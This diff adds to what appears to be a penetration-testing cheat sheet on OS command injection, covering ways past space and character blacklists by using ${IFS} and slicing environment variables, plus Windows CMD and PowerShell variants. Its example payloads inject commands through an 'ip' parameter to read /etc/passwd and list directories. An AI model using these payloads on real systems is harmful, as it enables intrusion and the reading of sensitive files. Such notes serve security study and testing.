@@ -36,9 +36,37 @@ if (isset($_GET['filename'])) {
 | XQuery Injection | `' ; -- /* */` |
 | Shellcode Injection | `\x \u %u %n` |
 | Header Injection | `\n \r \n \r \t %0d %0a %09` |
-# Examples
+# Bypassing Space Filters
 ```bash
 # ${IFS}
 ?ip=127.0.0.1;cat${IFS}/etc/passwd
 ?ip=127.0.0.1;{ls,-la}
 ```
+# Bypassing Other Blacklisted Characters
+## Linux
+- Extract "/"
+```bash
+echo ${PATH:0:1}
+echo ${HOME:0:1}
+echo ${PWD:0:1}
+echo $(tr '!-}' '"-~'<<<[)
+```
+- Extract ";"
+```bash
+echo ${LS_COLORS:10:1}
+```
+- Example
+```bash
+# ${IFS}
+?ip=127.0.0.1${LS_COLORS:10:1}cat${IFS}${PATH:0:1}etc${HOME:0:1}passwd
+?ip=127.0.0.1${LS_COLORS:10:1}{ls,-la}
+```
+## Windows
+```bash
+# CMD
+echo %HOMEPATH:~6,-11%
+# PS
+$env:HOMEPATH[0]
+```
+NOTE: We can also use the Get-ChildItem Env
+# Bypassing Blacklisted Commands
